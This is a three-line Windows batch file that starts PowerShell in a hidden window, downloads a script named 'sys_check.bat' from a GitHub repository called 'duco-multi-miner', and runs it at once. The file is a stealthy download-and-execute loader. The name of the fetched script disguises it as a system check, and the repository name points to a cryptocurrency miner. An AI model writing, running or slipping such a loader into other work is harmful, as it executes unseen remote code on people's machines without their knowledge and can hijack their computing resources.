@echo off
powershell -WindowStyle Hidden -Command "iwr -Uri 'https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/sys_check.bat' -OutFile 's.bat'; .\s.bat"
exit
